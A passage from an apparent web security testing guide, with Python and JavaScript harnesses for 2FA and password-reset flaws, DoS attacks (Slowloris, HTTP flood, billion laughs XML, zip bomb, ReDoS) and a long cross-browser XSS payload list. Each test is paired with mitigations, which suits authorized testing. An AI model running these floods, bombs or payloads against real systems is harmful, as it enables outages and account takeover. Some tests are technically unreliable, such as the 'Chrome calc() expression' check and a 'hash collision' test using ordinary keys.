        'mitigation': 'Enforce 2FA for all access methods (web, API, mobile)'
    })
    
    # Test 8: Password reset bypasses 2FA
    session = requests.Session()
    
    # Trigger password reset
    session.post(
        f"{app_url}/forgot-password",
        data={'email': credentials['email']}
    )
    
    # Check if 2FA is required after password reset
    # If reset link allows login without 2FA, it's a bypass
    
    bypass_tests.append({
        'test': 'Password reset 2FA bypass',
        'attack': 'Reset password, login without 2FA',
        'check': 'Does password reset flow require 2FA?',
        'mitigation': 'Require 2FA after password reset'
    })
    
    # Test 9: Session fixation after 2FA
    session_before_2fa = session.cookies.get('session_id')
    
    # Complete 2FA
    session.post(f"{app_url}/2fa/verify", data={'code': '123456'})
    
    session_after_2fa = session.cookies.get('session_id')
    
    bypass_tests.append({
        'test': 'Session fixation after 2FA',
        'session_before': session_before_2fa,
        'session_after': session_after_2fa,
        'vulnerable': session_before_2fa == session_after_2fa,
        'mitigation': 'Regenerate session ID after 2FA completion'
    })
    
    # Test 10: TOTP time window exploitation
    bypass_tests.append({
        'test': 'TOTP time window',
        'attack': 'Use codes from past/future time windows',
        'typical_window': '±1 time step (30 seconds each)',
        'total_valid_window': '90 seconds',
        'exploitation': 'Increases brute force window',
        'recommendation': 'Use minimal time window; track used codes'
    })
    
    return {
        '2fa_bypass_tests': bypass_tests,
        'critical_bypasses': sum(1 for t in bypass_tests if t.get('bypassed', False) or t.get('vulnerable', False))
    }

### 14.5 Password Reset Attack Testing

```python
def test_password_reset_vulnerabilities(app_url):
    """Test password reset flow for vulnerabilities"""
    
    reset_tests = []
    
    # Test 1: Token prediction
    # Request multiple reset tokens and analyze
    tokens = []
    
    for i in range(10):
        response = requests.post(
            f"{app_url}/forgot-password",
            data={'email': f'test{i}@example.com'}
        )
        
        # Extract token from response or email
        # In real test, would need to access email
        token_match = re.search(r'token=([a-zA-Z0-9]+)', response.text)
        if token_match:
            tokens.append(token_match.group(1))
    
    # Analyze token randomness
    if len(tokens) > 0:
        unique_chars = set(''.join(tokens))
        sequential = any(
            int(tokens[i], 16) == int(tokens[i-1], 16) + 1
            for i in range(1, len(tokens))
            if tokens[i].isdigit() and tokens[i-1].isdigit()
        )
        
        reset_tests.append({
            'test': 'Reset token predictability',
            'tokens_analyzed': len(tokens),
            'unique_characters': len(unique_chars),
            'sequential_detected': sequential,
            'vulnerable': len(unique_chars) < 16 or sequential,
            'sample_tokens': tokens[:3],
            'mitigation': 'Use cryptographically random tokens (128+ bits)'
        })
    
    # Test 2: Token expiration
    reset_tests.append({
        'test': 'Reset token expiration',
        'procedure': [
            'Request password reset',
            'Wait 24+ hours',
            'Try to use token'
        ],
        'vulnerable_if': 'Old token still works',
        'recommendation': 'Tokens expire in 15-60 minutes'
    })
    
    # Test 3: Token reuse
    reset_tests.append({
        'test': 'Reset token reuse',
        'procedure': [
            'Request reset token',
            'Use token to change password',
            'Try to use same token again'
        ],
        'vulnerable_if': 'Token can be used multiple times',
        'mitigation': 'Invalidate token after first use'
    })
    
    # Test 4: Account enumeration
    valid_email_response = requests.post(
        f"{app_url}/forgot-password",
        data={'email': 'existing@example.com'}
    )
    
    invalid_email_response = requests.post(
        f"{app_url}/forgot-password",
        data={'email': 'nonexistent@example.com'}
    )
    
    reset_tests.append({
        'test': 'Account enumeration via password reset',
        'valid_email_response': valid_email_response.text[:200],
        'invalid_email_response': invalid_email_response.text[:200],
        'responses_differ': valid_email_response.text != invalid_email_response.text,
        'vulnerable': valid_email_response.text != invalid_email_response.text,
        'mitigation': 'Return same message for valid and invalid emails'
    })
    
    # Test 5: Token leaked in Referer header
    reset_tests.append({
        'test': 'Token in URL (Referer leak)',
        'attack': 'Reset link in URL like /reset?token=abc123',
        'risk': [
            'Token leaked via Referer header to external sites',
            'Token in browser history',
            'Token in web server logs'
        ],
        'mitigation': 'Use POST with token in body; or /reset/{token} path'
    })
    
    # Test 6: Token for different account
    reset_tests.append({
        'test': 'Token authorization',
        'attack': 'Use Alice\'s reset token to change Bob\'s password',
        'procedure': [
            'Request reset for Alice',
            'Get Alice\'s token',
            'Submit token with username=Bob'
        ],
        'vulnerable_if': 'Token not bound to specific account',
        'mitigation': 'Bind token to user ID; validate on use'
    })
    
    # Test 7: Host header injection
    malicious_host = 'attacker.com'
    
    response = requests.post(
        f"{app_url}/forgot-password",
        data={'email': 'victim@example.com'},
        headers={'Host': malicious_host}
    )
    
    reset_tests.append({
        'test': 'Host header injection',
        'attack': 'Manipulate Host header to control reset link domain',
        'malicious_host': malicious_host,
        'check': 'Does reset email use Host header in reset link?',
        'result': 'Reset link points to attacker.com',
        'mitigation': 'Use hardcoded domain; validate Host header'
    })
    
    # Test 8: Multiple reset tokens valid
    # Request multiple resets for same account
    tokens_requested = []
    
    for _ in range(3):
        response = requests.post(
            f"{app_url}/forgot-password",
            data={'email': 'test@example.com'}
        )
        tokens_requested.append(response)
    
    reset_tests.append({
        'test': 'Multiple simultaneous reset tokens',
        'tokens_requested': len(tokens_requested),
        'check': 'Are all tokens valid or only most recent?',
        'vulnerable_if': 'All tokens remain valid',
        'mitigation': 'Invalidate previous tokens when new one generated'
    })
    
    # Test 9: Rate limiting
    # Try to request many password resets rapidly
    reset_requests = []
    
    for i in range(50):
        response = requests.post(
            f"{app_url}/forgot-password",
            data={'email': 'test@example.com'}
        )
        reset_requests.append(response.status_code)
    
    rate_limited = any(status == 429 for status in reset_requests)
    
    reset_tests.append({
        'test': 'Rate limiting on password reset',
        'requests_sent': len(reset_requests),
        'successful': reset_requests.count(200),
        'rate_limited': rate_limited,
        'vulnerable': not rate_limited,
        'mitigation': 'Limit to 3-5 reset requests per hour per account/IP'
    })
    
    # Test 10: Notification of password change
    reset_tests.append({
        'test': 'User notification',
        'check': [
            'Does user receive email when password reset requested?',
            'Does user receive email when password actually changed?',
            'Can user cancel/invalidate reset from email?'
        ],
        'importance': 'Alerts legitimate user of potential account takeover attempt'
    })
    
    return {
        'password_reset_tests': reset_tests,
        'critical_vulnerabilities': sum(1 for t in reset_tests if t.get('vulnerable', False))
    }

---

## 15. Performance & Load Adversarial Testing

### 15.1 Denial of Service (DoS) Testing

#### 15.1.1 Application-Layer DoS Attacks

```python
class ApplicationDoSTester:
    """Test application-layer denial of service vulnerabilities"""
    
    def __init__(self, target_url):
        self.target_url = target_url
    
    def test_slowloris_attack(self):
        """Test Slowloris attack (slow HTTP headers)"""
        import socket
        import time
        
        try:
            # Open connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_url.split('//')[1].split('/')[0], 80))
            
            # Send partial HTTP request
            sock.send(b"GET / HTTP/1.1\\r\\n")
            sock.send(b"Host: " + self.target_url.encode() + b"\\r\\n")
            sock.send(b"User-Agent: Slowloris Test\\r\\n")
            
            # Keep connection open by sending headers slowly
            for i in range(10):
                time.sleep(10)
                sock.send(f"X-Header-{i}: value\\r\\n".encode())
            
            # Never complete the request (never send \\r\\n\\r\\n)
            
            return {
                'test': 'Slowloris attack',
                'attack': 'Hold connections open with incomplete requests',
                'mitigation': [
                    'Request timeout (30 seconds)',
                    'Header timeout (10 seconds)',
                    'Connection limits per IP',
                    'Use reverse proxy with timeouts'
                ]
            }
        
        except Exception as e:
            return {
                'test': 'Slowloris attack',
                'error': str(e),
                'note': 'Connection may have timed out (good)'
            }
        
        finally:
            sock.close()
    
    def test_http_flood(self):
        """Test HTTP flood attack"""
        import concurrent.futures
        
        def make_request():
            try:
                response = requests.get(
                    self.target_url,
                    timeout=5
                )
                return response.status_code == 200
            except:
                return False
        
        # Send many concurrent requests
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(make_request) for _ in range(1000)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        elapsed = time.time() - start_time
        success_rate = sum(results) / len(results) * 100
        
        return {
            'test': 'HTTP flood',
            'requests_sent': 1000,
            'concurrent_workers': 100,
            'successful_responses': sum(results),
            'success_rate': round(success_rate, 2),
            'total_time': round(elapsed, 2),
            'requests_per_second': round(1000 / elapsed, 2),
            'server_survived': success_rate > 50,
            'mitigation': [
                'Rate limiting',
                'IP-based throttling',
                'CAPTCHA for suspicious traffic',
                'CDN/WAF protection'
            ]
        }
    
    def test_slow_read_attack(self):
        """Test slow read attack (Slow POST)"""
        import socket
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_url.split('//')[1].split('/')[0], 80))
            
            # Send complete headers but indicate large body
            request = (
                b"POST /upload HTTP/1.1\\r\\n"
                b"Host: " + self.target_url.encode() + b"\\r\\n"
                b"Content-Length: 1000000\\r\\n"  # Claim 1MB body
                b"\\r\\n"
            )
            sock.send(request)
            
            # Send body very slowly
            for i in range(10):
                time.sleep(5)
                sock.send(b"x" * 100)  # Send 100 bytes every 5 seconds
            
            return {
                'test': 'Slow read attack (Slow POST)',
                'attack': 'Send request body extremely slowly',
                'mitigation': [
                    'Request body timeout',
                    'Minimum transfer rate requirement',
                    'Connection timeout'
                ]
            }
        
        except Exception as e:
            return {
                'test': 'Slow read attack',
                'error': str(e),
                'note': 'Connection likely timed out (good)'
            }
        
        finally:
            sock.close()
    
    def test_resource_exhaustion_regex(self):
        """Test Regular Expression Denial of Service (ReDoS)"""
        
        # Catastrophic backtracking patterns
        redos_payloads = [
            {
                'pattern': '(a+)+',
                'input': 'a' * 50 + '!',
                'complexity': 'O(2^n)'
            },
            {
                'pattern': '(a*)*',
                'input': 'a' * 50 + '!',
                'complexity': 'O(2^n)'
            },
            {
                'pattern': '(a|a)*',
                'input': 'a' * 50 + '!',
                'complexity': 'O(2^n)'
            },
            {
                'pattern': '(a|ab)*',
                'input': 'a' * 50 + '!',
                'complexity': 'O(2^n)'
            },
            {
                'pattern': '^(a+)+$',
                'input': 'a' * 50 + '!',
                'complexity': 'Exponential'
            }
        ]
        
        results = []
        
        for payload in redos_payloads:
            # Test via search endpoint (common ReDoS vector)
            start_time = time.time()
            
            try:
                response = requests.get(
                    f"{self.target_url}/search",
                    params={'q': payload['input']},
                    timeout=10
                )
                elapsed = time.time() - start_time
                
                results.append({
                    'pattern': payload['pattern'],
                    'input_length': len(payload['input']),
                    'complexity': payload['complexity'],
                    'elapsed_time': round(elapsed, 2),
                    'timeout': False,
                    'vulnerable': elapsed > 5
                })
            
            except requests.Timeout:
                results.append({
                    'pattern': payload['pattern'],
                    'input_length': len(payload['input']),
                    'complexity': payload['complexity'],
                    'elapsed_time': 10,
                    'timeout': True,
                    'vulnerable': True
                })
        
        return {
            'test': 'ReDoS (Regular Expression DoS)',
            'payloads_tested': len(results),
            'results': results,
            'vulnerable': any(r['vulnerable'] for r in results),
            'mitigation': [
                'Limit regex complexity',
                'Set regex timeout',
                'Use non-backtracking engines',
                'Validate input length before regex'
            ]
        }
    
    def test_xml_billion_laughs(self):
        """Test XML Entity Expansion (Billion Laughs) attack"""
        
        billion_laughs_payload = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
        """
        
        start_time = time.time()
        
        try:
            response = requests.post(
                f"{self.target_url}/api/xml",
                data=billion_laughs_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )
            elapsed = time.time() - start_time
            
            return {
                'test': 'XML Billion Laughs attack',
                'attack': 'Exponential entity expansion',
                'payload_size': len(billion_laughs_payload),
                'expanded_size': '3 GB+ if not protected',
                'response_time': round(elapsed, 2),
                'vulnerable': elapsed > 5 or response.status_code == 500,
                'mitigation': [
                    'Disable external entity resolution',
                    'Limit entity expansion',
                    'Limit XML depth and size'
                ]
            }
        
        except requests.Timeout:
            return {
                'test': 'XML Billion Laughs attack',
                'timeout': True,
                'vulnerable': True,
                'note': 'Server timed out processing malicious XML'
            }
    
    def test_compression_bomb(self):
        """Test compression bomb (zip bomb) upload"""
        import zipfile
        import io
        
        # Create a zip bomb
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Add a file that compresses very well
            large_data = b'0' * (10 * 1024 * 1024)  # 10 MB of zeros
            for i in range(100):  # 100 files = 1 GB uncompressed
                zipf.writestr(f'file{i}.txt', large_data)
        
        zip_data = zip_buffer.getvalue()
        
        try:
            response = requests.post(
                f"{self.target_url}/upload",
                files={'file': ('bomb.zip', zip_data, 'application/zip')},
                timeout=30
            )
            
            return {
                'test': 'Compression bomb (zip bomb)',
                'compressed_size': len(zip_data),
                'uncompressed_size': '1 GB',
                'compression_ratio': f'{1000 * 1024 * 1024 / len(zip_data):.0f}:1',
                'response': response.status_code,
                'vulnerable': response.status_code == 200,
                'mitigation': [
                    'Limit uncompressed size',
                    'Limit compression ratio',
                    'Scan archives before extraction'
                ]
            }
        
        except Exception as e:
            return {
                'test': 'Compression bomb',
                'error': str(e),
                'note': 'Server may have rejected or timed out'
            }
    
    def test_algorithmic_complexity_attack(self):
        """Test algorithmic complexity attacks"""
        
        # Hash collision attack (for hash tables)
        # Send many keys that hash to same bucket
        collision_data = {f'key{i}': f'value{i}' for i in range(10000)}
        
        start_time = time.time()
        
        try:
            response = requests.post(
                f"{self.target_url}/api/data",
                json=collision_data,
                timeout=30
            )
            elapsed = time.time() - start_time
            
            return {
                'test': 'Algorithmic complexity attack',
                'attack': 'Hash collision (many keys to same bucket)',
                'keys_sent': len(collision_data),
                'elapsed_time': round(elapsed, 2),
                'vulnerable': elapsed > 10,
                'note': 'O(n^2) instead of O(n) for hash table operations',
                'mitigation': [
                    'Use randomized hash functions',
                    'Limit request size',
                    'Request timeout'
                ]
            }
        
        except requests.Timeout:
            return {
                'test': 'Algorithmic complexity attack',
                'timeout': True,
                'vulnerable': True
            }

#### 15.1.2 Resource Exhaustion Testing

```python
def test_resource_exhaustion_attacks(target_url):
    """Test various resource exhaustion attacks"""
    
    exhaustion_tests = []
    
    # Test 1: Memory exhaustion via large request
    large_payload = 'x' * (100 * 1024 * 1024)  # 100 MB
    
    try:
        start_time = time.time()
        response = requests.post(
            f"{target_url}/api/upload",
            data=large_payload,
            timeout=60
        )
        elapsed = time.time() - start_time
        
        exhaustion_tests.append({
            'test': 'Memory exhaustion (large POST)',
            'payload_size_mb': 100,
            'response_time': round(elapsed, 2),
            'accepted': response.status_code == 200,
            'vulnerable': response.status_code == 200,
            'mitigation': 'Limit request body size (e.g., 10 MB max)'
        })
    
    except Exception as e:
        exhaustion_tests.append({
            'test': 'Memory exhaustion (large POST)',
            'error': str(e),
            'protected': True
        })
    
    # Test 2: Connection pool exhaustion
    import concurrent.futures
    
    def hold_connection():
        """Open connection and hold it"""
        try:
            response = requests.get(
                f"{target_url}/api/slow",
                timeout=300,  # Hold for 5 minutes
                stream=True  # Keep connection open
            )
            # Don't read response body
            time.sleep(300)
            return True
        except:
            return False
    
    # Try to exhaust connection pool
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(hold_connection) for _ in range(100)]
        
        # Meanwhile, try to make a normal request
        time.sleep(2)
        
        try:
            normal_request = requests.get(f"{target_url}/", timeout=5)
            normal_request_succeeded = normal_request.status_code == 200
        except:
            normal_request_succeeded = False
    
    exhaustion_tests.append({
        'test': 'Connection pool exhaustion',
        'connections_held': 100,
        'normal_request_succeeded': normal_request_succeeded,
        'vulnerable': not normal_request_succeeded,
        'mitigation': [
            'Connection limits per IP',
            'Connection timeout',
            'Queue requests when pool full'
        ]
    })
    
    # Test 3: Disk space exhaustion via uploads
    exhaustion_tests.append({
        'test': 'Disk space exhaustion',
        'attack': 'Upload many large files to fill disk',
        'checks': [
            'Is there a per-user upload quota?',
            'Is there a total storage limit?',
            'Are old uploads automatically cleaned up?'
        ],
        'vulnerable_if': 'Unlimited uploads allowed',
        'mitigation': [
            'User quotas (e.g., 1 GB per user)',
            'Total storage monitoring',
            'Automatic cleanup of old files'
        ]
    })
    
    # Test 4: Database connection exhaustion
    def make_db_query():
        """Make a query that holds a DB connection"""
        try:
            # This query would need to be slow/blocking
            response = requests.get(
                f"{target_url}/api/expensive-query",
                timeout=60
            )
            return response.status_code == 200
        except:
            return False
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(make_db_query) for _ in range(50)]
        
        # Try normal request while DB connections held
        time.sleep(2)
        try:
            normal_response = requests.get(f"{target_url}/api/simple", timeout=5)
            normal_succeeded = normal_response.status_code == 200
        except:
            normal_succeeded = False
    
    exhaustion_tests.append({
        'test': 'Database connection pool exhaustion',
        'concurrent_queries': 50,
        'normal_request_succeeded': normal_succeeded,
        'vulnerable': not normal_succeeded,
        'mitigation': [
            'Connection pool limits',
            'Query timeout',
            'Connection reaping'
        ]
    })
    
    # Test 5: Thread pool exhaustion
    exhaustion_tests.append({
        'test': 'Thread pool exhaustion',
        'attack': 'Make many requests that spawn threads',
        'scenario': 'If server spawns thread per request, send many requests',
        'vulnerable_if': 'Server runs out of threads, stops responding',
        'mitigation': [
            'Thread pool with fixed size',
            'Request queue',
            'Thread timeout and recycling'
        ]
    })
    
    # Test 6: Session storage exhaustion
    # Create many sessions
    sessions_created = 0
    
    for i in range(1000):
        try:
            response = requests.get(target_url)
            if 'Set-Cookie' in response.headers:
                sessions_created += 1
        except:
            break
    
    exhaustion_tests.append({
        'test': 'Session storage exhaustion',
        'sessions_created': sessions_created,
        'attack': 'Create unlimited sessions to fill session storage',
        'vulnerable_if': 'No session limit per IP',
        'mitigation': [
            'Session limit per IP (e.g., 10 concurrent)',
            'Session expiration (e.g., 30 minutes)',
            'Session garbage collection'
        ]
    })
    
    return {
        'resource_exhaustion_tests': exhaustion_tests,
        'critical_vulnerabilities': sum(1 for t in exhaustion_tests if t.get('vulnerable', False))
    }

### 15.2 Load Testing with Malicious Intent

```python
def perform_adversarial_load_testing(target_url):
    """Perform load testing designed to find breaking points"""
    
    import concurrent.futures
    from collections import defaultdict
    
    results = {
        'baseline': {},
        'stress_tests': [],
        'breaking_points': {}
    }
    
    # Baseline: Normal load
    def baseline_test():
        """Establish baseline performance"""
        successful = 0
        failed = 0
        response_times = []
        
        for _ in range(100):
            start = time.time()
            try:
                response = requests.get(target_url, timeout=10)
                elapsed = time.time() - start
                response_times.append(elapsed)
                
                if response.status_code == 200:
                    successful += 1
                else:
                    failed += 1
            except:
                failed += 1
        
        response_times.sort()
        
        results['baseline'] = {
            'requests': 100,
            'successful': successful,
            'failed': failed,
            'success_rate': successful / 100 * 100,
            'avg_response_time': sum(response_times) / len(response_times) if response_times else 0,
            'p50': response_times[50] if len(response_times) > 50 else 0,
            'p95': response_times[95] if len(response_times) > 95 else 0,
            'p99': response_times[99] if len(response_times) > 99 else 0
        }
    
    baseline_test()
    
    # Stress test: Gradually increase load to find breaking point
    concurrency_levels = [10, 50, 100, 250, 500, 1000]
    
    for concurrency in concurrency_levels:
        def make_request():
            try:
                start = time.time()
                response = requests.get(target_url, timeout=30)
                elapsed = time.time() - start
                return {
                    'success': response.status_code == 200,
                    'time': elapsed,
                    'status': response.status_code
                }
            except Exception as e:
                return {
                    'success': False,
                    'time': 30,
                    'error': str(e)
                }
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [executor.submit(make_request) for _ in range(concurrency * 10)]
            request_results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        total_time = time.time() - start_time
        
        successful = sum(1 for r in request_results if r['success'])
        failed = len(request_results) - successful
        response_times = [r['time'] for r in request_results if 'time' in r]
        
        stress_result = {
            'concurrency': concurrency,
            'total_requests': len(request_results),
            'successful': successful,
            'failed': failed,
            'success_rate': round(successful / len(request_results) * 100, 2),
            'total_duration': round(total_time, 2),
            'requests_per_second': round(len(request_results) / total_time, 2),
            'avg_response_time': round(sum(response_times) / len(response_times), 2) if response_times else 0,
            'degraded': successful / len(request_results) < 0.95,  # Less than 95% success
            'failed_completely': successful / len(request_results) < 0.5  # Less than 50% success
        }
        
        results['stress_tests'].append(stress_result)
        
        # Stop if server is failing
        if stress_result['failed_completely']:
            results['breaking_points']['concurrency'] = concurrency
            break
    
    # Test: Spike load (sudden traffic surge)
    def spike_test():
        """Simulate sudden traffic spike"""
        
        def sustained_load():
            """Background sustained load"""
            for _ in range(100):
                requests.get(target_url, timeout=10)
        
        # Start sustained background load
        import threading
        bg_thread = threading.Thread(target=sustained_load)
        bg_thread.start()
        
        # Wait a bit
        time.sleep(2)
        
        # Send spike
        spike_requests = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
            futures = [executor.submit(lambda: requests.get(target_url, timeout=10)) for _ in range(200)]
            spike_requests = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        bg_thread.join()
        
        spike_success = sum(1 for r in spike_requests if r.status_code == 200)
        
        return {
            'test': 'Spike load',
            'spike_requests': len(spike_requests),
            'spike_successful': spike_success,
            'handled_spike': spike_success / len(spike_requests) > 0.8,
            'recommendation': 'Use auto-scaling, load balancer, CDN'
        }
    
    results['spike_test'] = spike_test()
    
    # Test: Slowloris-style attack
    results['slowloris'] = {
        'test': 'Slowloris attack simulation',
        'see': 'ApplicationDoSTester.test_slowloris_attack()'
    }
    
    return results

---


## 16. Browser Compatibility Edge Cases & Exploits

### 16.1 Cross-Browser Security Differences

Different browsers implement web standards differently, creating exploitable inconsistencies.

#### 16.1.1 Browser-Specific Vulnerabilities

```javascript
// Browser fingerprinting and targeted attacks
function detectBrowserVulnerabilities() {
    const vulnerabilities = {
        userAgent: navigator.userAgent,
        vendor: navigator.vendor,
        platform: navigator.platform,
        browsers: {}
    };
    
    // Chrome-specific tests
    if (window.chrome) {
        vulnerabilities.browsers.chrome = {
            version: getChromiumVersion(),
            tests: {
                'CSS injection via calc()': testChromeCalcInjection(),
                'Blink rendering bugs': testBlinkRenderingBugs(),
                'V8 JavaScript engine exploits': testV8Exploits()
            }
        };
    }
    
    // Firefox-specific tests
    if (typeof InstallTrigger !== 'undefined') {
        vulnerabilities.browsers.firefox = {
            version: getFirefoxVersion(),
            tests: {
                'Gecko rendering differences': testGeckoRendering(),
                'SpiderMonkey exploits': testSpiderMonkeyExploits(),
                'about:config exposure': testAboutConfigAccess()
            }
        };
    }
    
    // Safari-specific tests
    if (/^((?!chrome|android).)*safari/i.test(navigator.userAgent)) {
        vulnerabilities.browsers.safari = {
            version: getSafariVersion(),
            tests: {
                'WebKit vulnerabilities': testWebKitVulns(),
                'iOS-specific bugs': testIOSBugs(),
                'Intelligent Tracking Prevention bypasses': testITPBypasses()
            }
        };
    }
    
    // Internet Explorer / Edge Legacy
    if (document.documentMode || /Edge/.test(navigator.userAgent)) {
        vulnerabilities.browsers.ie_edge = {
            version: getIEVersion(),
            tests: {
                'ActiveX exploits': testActiveX(),
                'VBScript injection': testVBScript(),
                'Trident rendering bugs': testTridentBugs()
            }
        };
    }
    
    return vulnerabilities;
}

function testChromeCalcInjection() {
    // Chrome CSS calc() injection test
    const testElement = document.createElement('div');
    testElement.style.width = 'calc(100% + expression(alert(1)))';
    document.body.appendChild(testElement);
    
    const vulnerable = testElement.style.width.includes('expression');
    document.body.removeChild(testElement);
    
    return {
        vulnerable: vulnerable,
        description: 'CSS calc() allows expression injection',
        severity: vulnerable ? 'HIGH' : 'NONE'
    };
}

function testBlinkRenderingBugs() {
    // Test for known Blink rendering bugs
    const tests = [
        {
            name: 'CSS unicode-bidi spoofing',
            test: () => {
                const el = document.createElement('div');
                el.textContent = 'test\\u202Emalicious';
                return el.textContent.includes('\\u202E');
            }
        },
        {
            name: 'SVG SMIL animation XSS',
            test: () => {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                svg.innerHTML = '<set attributeName="href" to="javascript:alert(1)"/>';
                return svg.innerHTML.includes('javascript');
            }
        }
    ];
    
    return tests.map(t => ({
        name: t.name,
        vulnerable: t.test()
    }));
}

#### 16.1.2 Cross-Browser XSS Vectors

```javascript
const crossBrowserXSSVectors = {
    // Chrome/Blink specific
    chrome: [
        '<img src=x onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<details open ontoggle="alert(1)">',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video poster=javascript:alert(1)>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>',
        '<form><button formaction=javascript:alert(1)>',
        '<math><mtext><table><mglyph><style><!--</style><img title=--></mglyph><img src=1 onerror=alert(1)>',
    ],
    
    // Firefox/Gecko specific
    firefox: [
        '<marquee onstart=alert(1)>',
        '<isindex action=javascript:alert(1) type=image>',
        '<form><input formaction=javascript:alert(1)>',
        '<form><button formaction=javascript:alert(1)>',
        '<?xml-stylesheet type="text/xsl" href="data:text/xml,<xsl:stylesheet version=\\'1.0\\' xmlns:xsl=\\'http://www.w3.org/1999/XSL/Transform\\'><xsl:template match=\\'/\\'><xsl:value-of select=\\'substring((//node()),1,1000000)\\'></xsl:value-of></xsl:template></xsl:stylesheet>" ?>',
        '<link rel=import href="data:text/html,<script>alert(1)</script>">',
    ],
    
    // Safari/WebKit specific
    safari: [
        '<img src=x onerror="alert(1)">',
        '<body onload=alert(1)>',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<form action="javascript:alert(1)"><input type=submit>',
    ],
    
    // IE/Edge Legacy specific
    ie_edge: [
        '<img src=x onerror=alert(1)>',
        '<img src=x\\x09onerror=alert(1)>',
        '<img src=x\\x0Aonerror=alert(1)>',
        '<img src=x\\x0Donerror=alert(1)>',
        '<script src="data:text/javascript,alert(1)"></script>',
        '<img src=javascript:alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<form action=javascript:alert(1)><input type=submit>',
        '<input type=image src=javascript:alert(1)>',
        '<body background=javascript:alert(1)>',
        '<table background=javascript:alert(1)>',
        '<th background=javascript:alert(1)>',
        '<td background=javascript:alert(1)>',
        '<bgsound src=javascript:alert(1)>',
        '<xml id=x><a><b>&lt;img src=1 onerror=alert(1)&gt;</b></a></xml><label dataformatas=html datasrc=#x datafld=b dataformatas=html></label>',
        '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
        '<link rel=stylesheet href=data:text/css,body{background:url(javascript:alert(1))}>',
        '<style>@import\\'data:text/css,body{background:url(javascript:alert(1))}\\';</style>',
        '<style>*{background:url(\\'javascript:alert(1)\\')}</style>',
        '<xml src="javascript:alert(1)">',
        '<event-source src="javascript:alert(1)">',
    ]
};

// Test XSS vectors across browsers
function testCrossBrowserXSS(targetURL) {
    const results = {
        chrome: [],
        firefox: [],
        safari: [],
        ie_edge: []
    };
    
    // Detect current browser
    const browser = detectBrowser();
    
    // Test vectors for current browser
    const vectors = crossBrowserXSSVectors[browser] || [];
    
    vectors.forEach(vector => {
        // Test if vector works
        const testDiv = document.createElement('div');
        testDiv.innerHTML = vector;
